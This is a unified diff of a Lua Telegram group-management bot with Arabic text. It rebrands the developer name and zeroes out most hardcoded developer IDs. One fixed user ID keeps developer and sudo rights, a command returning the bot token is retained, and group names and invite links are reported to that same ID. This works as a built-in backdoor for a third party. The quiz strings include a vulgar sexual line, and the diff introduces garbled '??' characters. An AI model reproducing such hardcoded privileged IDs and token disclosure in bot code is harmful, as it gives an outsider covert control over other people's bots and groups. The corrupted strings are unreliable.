@@ -178,7 +178,7 @@ function vardump(value)
 print(serpent.block(value, {comment=false}))   
 end 
 
-dev_users = {2096660722,01062069438,2096660722,01224165642}   
+dev_users = {0000000000,0000000000,2096660722,0000000000}   
 function Developers(msg)  
 local DRAGON = false  
 for k,v in pairs(dev_users) do  
@@ -189,7 +189,7 @@ end
 return DRAGON  
 end 
 
-dev_madison = {2096660722} 
+dev_islam = {2096660722} 
 function Devsiria(msg)  
 local DRAGON = false  
 for k,v in pairs(dev_siria) do  
@@ -199,7 +199,7 @@ end
 end  
 return DRAGON  
 end 
-sudo_users = {SUDO,2096660722,01062069438,2096660722,01224165642}   
+sudo_users = {SUDO,0000000000,0000000000,2096660722,0000000000}   
 function SudoBot(msg)  
 local DRAGON = false  
 for k,v in pairs(sudo_users) do  
@@ -346,13 +346,13 @@ end
 end
 
 function Can_or_NotCan(user_id,chat_id)
-if tonumber(user_id) == tonumber(2096660722) then  
+if tonumber(user_id) == tonumber(0000000000) then  
 var = true 
 elseif tonumber(user_id) == tonumber(2096660722) then
 var = true  
-elseif tonumber(user_id) == tonumber(01224165642) then
+elseif tonumber(user_id) == tonumber(0000000000) then
 var = true  
-elseif tonumber(user_id) == tonumber(01062069438) then
+elseif tonumber(user_id) == tonumber(0000000000) then
 var = true  
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = true  
@@ -2342,7 +2342,7 @@ https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. 
 end
 if text == "توكن البوت" and Developers(msg) or text == 'جلب التوكن' and Developers(msg) then 
 if not SudoBot(msg) then
-send(msg.chat_id_, msg.id_,'هذا الامر خاص بي سوريا فقط')
+send(msg.chat_id_, msg.id_,'هذا الامر خاص بي اسلامفقط')
 return false
 end
 local msg_id = msg.id_/2097152/0.5 
@@ -3164,7 +3164,7 @@ LinkGroup = LinkGp.result
 else
 LinkGroup = 'لا يوجد'
 end
-sendText(2096660722,"𖤍⤈ . هناك شخص يريدك يا سيدي سوريا \n𖤍⤈ الشخص  {"..Name.."}\n𖤍⤈ اسم الجروب {"..NameChat.."}\n𖤍⤈ ايدي الجروب { `"..msg.chat_id_.."` }\n𖤍⤈ رابط الجروب \n [ "..LinkGroup.." ]\n    𖤍⤈ رابط الرساله \n https://t.me/c/"..chatid.."/"..msg_id.."   ",0,'md')
+sendText(2096660722,"𖤍⤈ . هناك شخص يريدك يا سيدي اسلام\n𖤍⤈ الشخص  {"..Name.."}\n𖤍⤈ اسم الجروب {"..NameChat.."}\n𖤍⤈ ايدي الجروب { `"..msg.chat_id_.."` }\n𖤍⤈ رابط الجروب \n [ "..LinkGroup.." ]\n    𖤍⤈ رابط الرساله \n https://t.me/c/"..chatid.."/"..msg_id.."   ",0,'md')
 end,nil)
 end,nil)
 end
@@ -4655,7 +4655,7 @@ end
 
 if text == "توكن البوت" and Developers(msg) then 
 if not Devsiria(msg) then
-send(msg.chat_id_, msg.id_,'هذا الامر خاص بي سوريا فقط')
+send(msg.chat_id_, msg.id_,'هذا الامر خاص بي اسلامفقط')
 return false
 end
 local msg_id = msg.id_/2097152/0.5 
@@ -4721,7 +4721,7 @@ local vsiriav_Msg = {
 "روايتك المفضله ?", 
 "اخر اكله اكلتها", 
 "اخر كتاب قرآته", 
-"ليه سوريا جدع؟ ", 
+"ليه اسلامجدع؟ ", 
 "افضل يوم ف حياتك", 
 "ليه مضيفتش كل جهاتك", 
 "حكمتك ف الحياه", 
@@ -4971,7 +4971,7 @@ local vsiriav_Msg = {
   "اذكر موقف ماتنساه بعمرك؟ ",
   "وش حاب تقول للاشخاص اللي بيدخل حياتك؟ ",
   "ألطف شخص مر عليك بحياتك؟ ",
-   "هل سوريا لطيف؟ ",
+   "هل اسلاملطيف؟ ",
 "انت من الناس المؤدبة ولا نص نص؟ ",
   "كيف الصيد معاك هالأيام ؟ وسنارة ولاشبك؟ ",
   "لو الشخص اللي تحبه قال بدخل حساباتك بتعطيه ولا تكرشه؟ ",
@@ -5000,7 +5000,7 @@ local vsiriav_Msg = {
   "انسان م تحب تتعامل معاه ابداً ؟ ",
   "شيء بسيط تحتفظ فيه؟ ",
   "فُرصه تتمنى لو أُتيحت لك ؟ ",
-   "لي سوريا ناك اليكس؟ ",
+   "لي اسلامناك اليكس؟ ",
   "شيء مستحيل ترفضه ؟. ",
   "لو زعلت بقوة وش بيرضيك ؟ ",
   "تنام بـ اي مكان ، ولا بس غرفتك ؟ ",
@@ -7990,7 +7990,7 @@ local SO_FIR = bot_data:get(ban_id..'text:ch:user')
 if SO_FIR then
 send(msg.chat_id_, msg.id_,'['..SO_FIR..']')
 else
-send(msg.chat_id_, msg.id_,' 𖤍⤈  لا تستطيع استخدام البوت \n 𖤍⤈   يرجى الاشتراك بالقناه اولا \n 𖤍⤈   اشترك هنا ['..bot_data:get(ban_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' 𖤍⤈  لا تستطيع استخدام البوت \n ??⤈   يرجى الاشتراك بالقناه اولا \n 𖤍⤈   اشترك هنا ['..bot_data:get(ban_id..'add:ch:username')..']')
 end
 return false
 end
@@ -16384,7 +16384,7 @@ Msᴀɢ ~ #msgs
 ]],
 [[
 ᯓ 𝗨𝗦𝗘𝗥𝗡𝗮𝗺𝗘 . #username 🇪🇬 ꙰
-ᯓ 𝗦𝗧𝗮𝗦𝗧 . #stast 🇪🇬 ꙰
+ᯓ 𝗦??𝗮𝗦𝗧 . #stast 🇪🇬 ꙰
 ᯓ 𝗜𝗗 . #id 🇪🇬 ꙰
 ᯓ 𝗚𝗮𝗺𝗘𝗦 . #game 🇪🇬 ꙰
 ᯓ 𝗺𝗦𝗚𝗦 . #msgs ??🇬 ꙰
@@ -22537,7 +22537,7 @@ tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = 2096660722, offset_ = 
 end,nil)
 end
 end
-if text == "احمد رايلي" or text == "احمد" then
+if text == "المبرمج اسلام" or text == "اسلام" then
 local TEXT_SUD = bot_data:get(ban_id..'DRAGON:TEXT_SUDO')
 if TEXT_SUDO then 
 send(msg.chat_id_, msg.id_,TEXT_SUDO)
